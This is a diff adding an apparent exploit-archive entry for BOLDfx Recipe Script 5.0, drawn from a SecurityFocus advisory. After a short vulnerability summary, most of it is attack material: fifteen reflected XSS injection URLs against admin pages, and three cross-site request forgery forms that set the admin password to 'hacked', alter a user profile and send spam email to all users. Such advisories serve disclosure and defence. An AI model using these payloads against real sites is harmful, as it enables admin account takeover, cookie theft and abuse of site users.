@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/41787/info
+
+BOLDfx Recipe Script is prone to multiple remote vulnerabilities, including multiple cross-site request-forgery vulnerabilities, an arbitrary file upload vulnerability, multiple HTML-injection vulnerabilities and multiple cross-site scripting vulnerabilities.
+
+Attacker-supplied HTML and script code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user. A remote attacker may also be able to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+Recipe Script 5.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/recipes/admin/recipes.php?searchword="[XSS]
+http://www.example.com/recipes/admin/recipes.php?numitem="[XSS]
+http://www.example.com/recipes/admin/categories.php?searchword="[XSS]
+http://www.example.com/recipes/admin/categories.php?numitem="[XSS]
+http://www.example.com/recipes/admin/all_comments.php?searchword="[XSS]
+http://www.example.com/recipes/admin/all_comments.php?numitem="[XSS]
+http://www.example.com/recipes/admin/users.php?searchword="[XSS]
+http://www.example.com/recipes/admin/users.php?numitem="[XSS]
+http://www.example.com/recipes/admin/comments.php?searchword="[XSS]
+http://www.example.com/recipes/admin/comments.php?numitem="[XSS]
+http://www.example.com/recipes/admin/menus.php?numitem="[XSS]
+http://www.example.com/recipes/admin/links.php?searchword="[XSS]
+http://www.example.com/recipes/admin/links.php?numitem="[XSS]
+http://www.example.com/recipes/admin/banners.php?searchword="[XSS]
+http://www.example.com/recipes/admin/banners.php?numitem="[XSS]
+
+
+<form action="http://www.example.com/recipes/update_profile.php" method="POST"> <input name="first_name" type="text" value="DEMO"> <input name="last_name" type="text" value="USER"> <input name="website" type="text" value="website.com"> <input name="country" type="text" value="Moon State"> <input name="email" type="text" value="our@email.com"> <input type="checkbox" name="subscribed" value="1"> <input type="submit" name="Submit" value="Update"> </form> <form action="http://www.example.com/recipes/admin/adminpass.php" method="POST"> <input type="password" name="AdminPass" value="hacked"> <input type="password" name="cAdminPass" value="hacked"> <input type="submit" name="submit" value="Update Password"> </form> <form action="http://www.example.com/recipes/admin/send_email_users.php" method="POST"> <input type="hidden" name="from_email" value="support@site.com"> <input type="hidden" name="subject" value="Subject"> <input type="hidden" name="message" value="Free your mind and the ass will follow!"> <input type="hidden" name="emailtype" value=""> <input type="submit" name="Submit" value="Send"> </form> 
